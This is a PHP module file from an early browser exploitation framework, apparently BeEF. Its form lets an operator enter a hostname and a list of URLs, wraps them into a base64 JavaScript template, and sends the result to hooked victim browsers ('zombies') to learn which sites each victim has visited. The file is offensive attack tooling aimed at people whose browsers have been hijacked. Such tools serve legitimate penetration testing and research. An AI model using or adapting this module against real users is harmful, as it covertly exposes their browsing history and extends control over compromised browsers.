<?php
	// Copyright (c) 2006, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>
<script>
	Element.Methods.construct_code = function() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<?php echo get_b64_file(JS_FILE); ?>';


        	var urllist = document.cmd_form.urls.value.split(/\r?\n/);
        	var result = urllist[0];
        	for (var i=1; i < urllist.length; i++) {
                	result += '!' + document.cmd_form.hostname + urllist[i];
                }

		// replace sections of the code with user input
		b64code = b64replace(b64code, "RAWURLS", result);
		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<div id="module_header">Visited URLs</div>
<div id="module_subsection">
	<form name="cmd_form">
		<div id="module_subsection_header">URLs</div>
		IP or Hostname: <input type="text" name="hostname"><br />
		<textarea name="urls" rows="5" cols="80"><?php echo(file_get_contents('fingerprints')) ?></textarea>
		<input class="button" type="button" value="send" onClick="javascript:construct_code(urls.value)"/>
	</form>
</div>


	</body>
</html>
